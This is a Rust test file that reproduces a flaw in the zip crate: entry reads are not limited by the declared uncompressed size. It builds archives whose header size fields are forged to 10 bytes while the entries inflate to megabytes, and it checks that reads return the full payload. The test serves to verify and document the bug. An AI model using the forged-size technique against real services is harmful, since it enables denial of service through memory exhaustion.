//! zip-4 (resource-exhaustion): entry reads are not bounded by the declared
//! uncompressed size. make_reader wraps the decompressor only in Crc32Reader
//! (src/read.rs:436), which reads to the end of the stream with no size limit
//! (src/crc32.rs:46,59). An archive can declare 10 bytes for an entry that
//! inflates to many megabytes; decompressed_size() and size() report 10 while
//! read() produces the whole payload and returns Ok, so a size check built on
//! the declared sizes is not a bound on output or memory.
//!
//! Measurement: two payloads of different real size, each with declared size
//! patched to 10. We record compressed bytes (tiny, nearly constant) and
//! produced bytes (≈ real size). The produced output grows with the real
//! payload, not the declared 10, and read returns Ok. Exit 0 only if both
//! oversize reads succeed and output tracks the real size.

use std::io::{Cursor, Read, Write};
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

const DECLARED: u32 = 10;

/// One deflated entry of `real` zero bytes, with the uncompressed size in both
/// headers overwritten to DECLARED. The CRC-32 still matches the real data.
fn lying_archive(real: usize) -> Vec<u8> {
    let mut w = ZipWriter::new(Cursor::new(Vec::new()));
    w.start_file(
        "a.bin",
        SimpleFileOptions::default().compression_method(CompressionMethod::Deflated),
    )
    .unwrap();
    w.write_all(&vec![0u8; real]).unwrap();
    let mut data = w.finish().unwrap().into_inner();
    let local = data.windows(4).position(|s| s == b"PK\x03\x04").unwrap();
    let central = data.windows(4).position(|s| s == b"PK\x01\x02").unwrap();
    data[local + 22..local + 26].copy_from_slice(&DECLARED.to_le_bytes());
    data[central + 24..central + 28].copy_from_slice(&DECLARED.to_le_bytes());
    data
}

fn produced_bytes(real: usize) -> (usize, usize) {
    let data = lying_archive(real);
    let compressed = data.len();
    let mut archive = ZipArchive::new(Cursor::new(data)).unwrap();
    assert_eq!(archive.decompressed_size(), Some(u128::from(DECLARED)));
    let mut f = archive.by_index(0).unwrap();
    assert_eq!(f.size(), u64::from(DECLARED), "size() reports the declared value");
    let mut out = Vec::new();
    f.read_to_end(&mut out).expect("read_to_end returned Ok");
    (compressed, out.len())
}

#[test]
fn reads_exceed_declared_size() {
    let small = 2 * 1024 * 1024usize;
    let large = 8 * 1024 * 1024usize;
    let (c1, p1) = produced_bytes(small);
    let (c2, p2) = produced_bytes(large);
    eprintln!("declared size = {DECLARED} bytes for every entry");
    eprintln!("real = {small} -> compressed archive {c1} bytes, read produced {p1} bytes");
    eprintln!("real = {large} -> compressed archive {c2} bytes, read produced {p2} bytes");
    assert_eq!(p1, small, "output should equal the real payload, unbounded by declared size");
    assert_eq!(p2, large, "output should equal the real payload, unbounded by declared size");
    assert!(
        p1 > DECLARED as usize * 1000 && p2 > p1,
        "BUG NOT PRESENT: output was bounded by the declared size"
    );
    eprintln!(
        "REPRODUCED: a ~{}KB archive declaring {DECLARED} bytes produced {}MB; output tracks the real size, not the declared one",
        c2 / 1024,
        p2 / (1024 * 1024)
    );
}
